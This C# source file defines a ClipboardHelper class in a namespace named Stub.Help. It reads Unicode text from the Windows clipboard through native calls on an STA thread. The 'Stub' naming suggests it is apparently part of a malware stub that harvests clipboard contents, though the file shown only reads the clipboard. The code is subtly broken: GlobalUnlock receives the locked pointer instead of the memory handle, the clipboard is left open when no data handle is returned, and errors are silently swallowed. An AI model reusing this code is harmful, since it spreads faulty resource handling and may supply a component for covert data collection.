using Stub.Help.Native;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;


namespace Stub.Help
{
    class ClipboardHelper
    {
        private const uint CF_UNICODETEXT = 13;

        public static string GetText()
        {
            if (NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT) && NativeMethods.OpenClipboard(IntPtr.Zero))
            {
                string data = string.Empty;
                IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
                if (hGlobal != IntPtr.Zero)
                {
                    IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
                    if (lpwcstr != IntPtr.Zero)
                    {
                        try
                        {
                            data = Marshal.PtrToStringUni(lpwcstr);
                        }
                        finally
                        {
                            NativeMethods.GlobalUnlock(lpwcstr);
                        }
                    }
                    NativeMethods.CloseClipboard();
                }
                return data;
            }
            return null;
        }

        public static string GetClipboardText()
        {
            string returnValue = string.Empty;
            try
            {
                Thread thread = new Thread(() =>
                {
                    returnValue = GetText();
                });
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();
            }
            catch { }
            return returnValue;
        }
    }
}
